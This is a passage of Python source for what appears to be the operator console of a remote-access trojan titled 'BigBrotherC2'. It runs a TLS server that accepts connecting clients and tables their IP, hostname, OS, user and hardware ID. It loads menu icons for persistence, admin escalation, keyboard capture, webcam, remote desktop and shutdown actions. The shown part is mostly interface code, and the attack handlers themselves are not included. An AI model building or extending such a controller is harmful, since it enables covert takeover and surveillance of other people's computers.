    print("Server Started...")
    server_socket.setblocking(False)
    
    while running:
        if running == False:
            print("Stopping Server")
            for i in tree.get_children():
                tree.delete(i)
            server_socket.close()
            break
        try:
            csock, caddr = server_socket.accept()
            csock = context.wrap_socket(csock, server_side=True, do_handshake_on_connect=True)
            logging.info(f"New Connection! Address: {caddr}")
            logging.debug("Address has been saved in the client sockets dictionary")
            connected_clients += 1
            logging.debug(f"Connected clients has increased by 1. {connected_clients} is connected")
            threading.Thread(target=handle_client, args=(csock,)).start()
            logging.debug("Client Handler Thread has been Started")
        except Exception as e:
            logging.error(f"Server Error: {e}")
        except SystemExit:
            print("Stopping Server...")
            break

def on_quit():
    global running
    running = False
    logging.info("Shutting Down Server")
    root.destroy()
    os._exit(0)

#jit(nopython=True(nopython=True)
def update_labels():
    while True:
        cpu_label.configure(text=f"{available_langs[selected_language]['cpu_usage']}: {str(psutil.cpu_percent())}%")
        ram_label.configure(text=f"{available_langs[selected_language]['ram_usage']}: {psutil.virtual_memory().percent}%")
        time.sleep(1)

def click_deselect(event):
    index = tree.identify_row(event.y)
    item = tree.item(index)
    #print(item)
    if item["values"] == "":
        tree.selection_set([])
        #print("Deselected")
server_thread = threading.Thread(target=start_server, args=(IP, PORT))

root = CTk()
if not root:
    logging.critical("Couldn't initilize the gui! check if tkinter and customtkinter are installed and able to launch.")

# INITILIZING ICONS

ping_icon = Image.open("assets/context_menu/ping.png")
ping_icon = ping_icon.resize((16, 16))
ping_icon = ImageTk.PhotoImage(ping_icon)

persist_icon = Image.open("assets/context_menu/persistance.png")
persist_icon = persist_icon.resize((16, 16))
persist_icon = ImageTk.PhotoImage(persist_icon)

admin_icon = Image.open("assets/context_menu/shield.png")
admin_icon = admin_icon.resize((16, 16))
admin_icon = ImageTk.PhotoImage(admin_icon)

url_icon = Image.open("assets/context_menu/url.png")
url_icon = url_icon.resize((16, 16))
url_icon = ImageTk.PhotoImage(url_icon)

wallpaper_icon = Image.open("assets/context_menu/wallpaper.png")
wallpaper_icon = wallpaper_icon.resize((16, 16))
wallpaper_icon = ImageTk.PhotoImage(wallpaper_icon)

skull_icon = Image.open("assets/context_menu/skull.png")
skull_icon = skull_icon.resize((16, 16))
skull_icon = ImageTk.PhotoImage(skull_icon)

tskmgr_icon = Image.open("assets/context_menu/task-manager.png")
tskmgr_icon = tskmgr_icon.resize((16, 16))
tskmgr_icon = ImageTk.PhotoImage(tskmgr_icon)

keyboard_icon = Image.open("assets/context_menu/kb.png")
keyboard_icon = keyboard_icon.resize((16, 16))
keyboard_icon = ImageTk.PhotoImage(keyboard_icon)

disconnect_icon = Image.open("assets/context_menu/disconnect.png")
disconnect_icon = disconnect_icon.resize((16, 16))
disconnect_icon = ImageTk.PhotoImage(disconnect_icon)

rdp_icon = Image.open("assets/context_menu/remote-desktop.png")
rdp_icon = rdp_icon.resize((16, 16))
rdp_icon = ImageTk.PhotoImage(rdp_icon)

power_icon = Image.open("assets/context_menu/power.png")
power_icon = power_icon.resize((26, 26))
power_icon = ImageTk.PhotoImage(power_icon)

poweroff_icon = Image.open("assets/context_menu/windows_poweroff.png")
poweroff_icon = poweroff_icon.resize((16, 16))
poweroff_icon = ImageTk.PhotoImage(poweroff_icon)

restart_icon = Image.open("assets/context_menu/restart.png")
restart_icon = restart_icon.resize((18, 18))
restart_icon = ImageTk.PhotoImage(restart_icon)

monitor_icon = Image.open("assets/context_menu/monitor.png")
monitor_icon = monitor_icon.resize((16, 16))
monitor_icon = ImageTk.PhotoImage(monitor_icon)

on_icon = Image.open("assets/context_menu/green_circle.png")
on_icon = on_icon.resize((16, 16))
on_icon = ImageTk.PhotoImage(on_icon)

off_icon = Image.open("assets/context_menu/red_circle.png")
off_icon = off_icon.resize((16, 16))
off_icon = ImageTk.PhotoImage(off_icon)

net_icon = Image.open("assets/context_menu/net.png")
net_icon =  net_icon.resize((16, 16))
net_icon = ImageTk.PhotoImage(net_icon)

webcam_icon = Image.open("assets/context_menu/webcam.png")
webcam_icon = webcam_icon.resize((16, 16))
webcam_icon = ImageTk.PhotoImage(webcam_icon)

camera_icon = Image.open("assets/context_menu/camera_2.png")
camera_icon = camera_icon.resize((16, 16))
camera_icon = ImageTk.PhotoImage(camera_icon)

arrow_icon = Image.open("assets/context_menu/arrow.png")
arrow_icon = arrow_icon.resize((16, 16))
arrow_icon = arrow_icon.rotate(-180)
arrow_icon = ImageTk.PhotoImage(arrow_icon)

music_icon = Image.open("assets/context_menu/music_disc.png")
music_icon = music_icon.resize((16, 16))
music_icon = ImageTk.PhotoImage(music_icon)

logout_icon = Image.open("assets/context_menu/standby.png")
# No need for resizing. its already small enough
logout_icon = ImageTk.PhotoImage(logout_icon)

file_icon = Image.open("assets/context_menu/file.png")
file_icon = file_icon.resize((16, 16))
file_icon = ImageTk.PhotoImage(file_icon)

def change_lang(lang):
    global selected_language
    try:
        selected_language = lang
        tree.heading("id", text=f"{available_langs[selected_language]['columns_names'][0]}", anchor="w")
        tree.heading("ip", text=f"{available_langs[selected_language]['columns_names'][1]}", anchor="center")
        tree.heading("host", text=f"{available_langs[selected_language]['columns_names'][2]}", anchor="center")
        tree.heading("os", text=f"{available_langs[selected_language]['columns_names'][3]}", anchor="center")
        tree.heading("version", text=f"{available_langs[selected_language]['columns_names'][4]}", anchor="center")
        tree.heading("user", text=f"{available_langs[selected_language]['columns_names'][5]}", anchor="center")
        tree.heading("name", text=f"{available_langs[selected_language]['columns_names'][6]}", anchor="center")
        tree.heading("hwid", text=f"{available_langs[selected_language]['columns_names'][7]}", anchor="center")
        if running == False:
            listen_button.configure(text=f"{available_langs[selected_language]["listen_button"]}")
        if running:
            listen_button.configure(text=f"{available_langs[selected_language]["listen_button_clicked"]}")
        select_all.configure(text=f"{available_langs[selected_language]['select_all_button']}")
        deselect.configure(text=f"{available_langs[selected_language]['deselect_all']}")
    except KeyError:
        change_lang("english")

root.geometry("1300x600")
root.title(f"BigBrotherC2 | IP: {IP} PORT: {PORT}")
root.iconbitmap("assets/icon.ico")
widgets = []
style = ttk.Style(root)
#sv_ttk.set_theme("dark")

style.configure("Treeview", rowheight=22, font=("Helvitica", 12), background="black", foreground="white")
style.configure("Treeview.Heading", relief="solid", font=("Segoe UI Emoji", 12), foreground="black", background="white")
style.map("Treeview.Item", [("active", "#7C41C9")])

style.configure("Treeview.Item",
                borders=True,
                borderwidth=20,
                relief="solid",
                background="black",
                foreground="white",
                font=('Segoe UI Emoji', 10))

style.map("Treeview", background=[("selected", "#1D71D1")])

style.layout("Treeview", [
    ('Treeview.Treearea', {'sticky': 'nswe'})
])


tree = ttk.Treeview(root, columns=("id", "ip", "host", "os", "version", "user", "name", "hwid"), show="headings")
tree.bind("<Button-1>", click_deselect)

tree.heading("id", text=f"{available_langs[selected_language]['columns_names'][0]}", anchor="w")
tree.heading("ip", text=f"{available_langs[selected_language]['columns_names'][1]}", anchor="center")
tree.heading("host", text=f"{available_langs[selected_language]['columns_names'][2]}", anchor="center")
tree.heading("os", text=f"{available_langs[selected_language]['columns_names'][3]}", anchor="center")
tree.heading("version", text=f"{available_langs[selected_language]['columns_names'][4]}", anchor="center")
tree.heading("user", text=f"{available_langs[selected_language]['columns_names'][5]}", anchor="center")
tree.heading("name", text=f"{available_langs[selected_language]['columns_names'][6]}", anchor="center")
tree.heading("hwid", text=f"{available_langs[selected_language]['columns_names'][7]}", anchor="center")

tree.pack(fill="both", expand=True)

tree.column("id", anchor="w", width=60)
tree.column("ip", anchor="center", width=90)
tree.column("host", anchor="center", width=70)
tree.column("os", anchor="center", width=220)
tree.column("version", anchor="center", width=50)
tree.column("user", anchor="center", width=65)
tree.column("name", anchor="center", width=100)
tree.column("hwid", anchor="center")

_font = ("Segoe UI Emoji", 12)
status_frame = tkinter.Frame(root)
status_frame.pack(fill="x", side="bottom")

listen_button = ttk.Button(status_frame, text=f"{available_langs[selected_language]['listen_button']}", command=server_thread.start)

listen_button.pack(padx=5, pady=5, side="left")

select_all = ttk.Button(status_frame, text=f"{available_langs[selected_language]['select_all_button']}", command=lambda: tree.selection_add(tree.get_children()))

select_all.pack(padx=5, pady=5, side="left")

deselect = ttk.Button(status_frame, text=f"{available_langs[selected_language]['deselect_all']}", command=lambda: tree.selection_remove(tree.selection()))

deselect.pack(padx=5, pady=5, side="left")

cpu_label = tkinter.Label(status_frame, text=f"{available_langs[selected_language]['cpu_usage']}: {str(psutil.cpu_percent())}", border=2, font=_font)

cpu_label.pack(side="left")

ram_label = tkinter.Label(status_frame, text=f"{available_langs[selected_language]['ram_usage']}: {psutil.virtual_memory().percent}", font=_font)
ram_label.pack(side="left")

lang_val = tkinter.StringVar(root, value="english")
language_box = ttk.Combobox(status_frame, values=list(languages.values()), textvariable=lang_val, state="readonly")
language_box.bind("<<ComboboxSelected>>", lambda x: change_lang(language_box.get()))
language_box.pack(side="right")

root.bind("<Button-3>", context_menu)
root.protocol("WM_DELETE_WINDOW", on_quit)
change_lang("dafgadrf")
threading.Thread(target=update_labels).start()

root.mainloop()